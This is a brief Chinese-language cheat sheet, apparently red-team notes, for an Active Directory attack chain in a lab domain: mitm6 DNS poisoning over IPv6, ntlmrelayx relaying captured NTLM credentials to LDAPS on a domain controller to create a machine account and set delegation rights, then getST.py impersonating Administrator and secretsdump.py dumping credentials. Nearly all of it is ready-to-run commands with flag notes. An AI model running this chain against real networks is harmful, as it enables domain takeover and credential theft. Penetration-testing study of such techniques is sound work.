	DNS 中毒 - 使用 mitm6 进行中继委托
	要求：
	启用 IPv6（Windows 更喜欢 IPv6 而不是 IPv4）
	基于 TLS 的 LDAP (LDAPS)
	ntlmrelayx 将捕获的凭据中继到域控制器上的 LDAP，使用它来创建新的机器帐户，打印帐户的名称和密码并修改它的委派权限。
	>git clone https://github.com/fox-it/mitm6.git 
	>cd /opt/tools/mitm6
	>pip install .
	mitm6 -hw ws02 -d lab.local --ignore-nofqnd
	-d: 我们过滤请求的域名（被攻击的域）
	-i: 我们让 mitm6 监听事件的接口
	-hw: 主机白名单
	ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad
	ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad --add-computer
	-ip: 您希望中继运行的接口
	-wh: WPAD 主机，指定要提供的 wpad 文件
	t: 您要中继到的目标

	现在授予委托权限，然后执行 RBCD
	ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
	getST.py -spn cifs/target.lab.local lab.local/GENERATED\$ -impersonate Administrator  
	export KRB5CCNAME=administrator.ccache  
	secretsdump.py -k -no-pass target.lab.local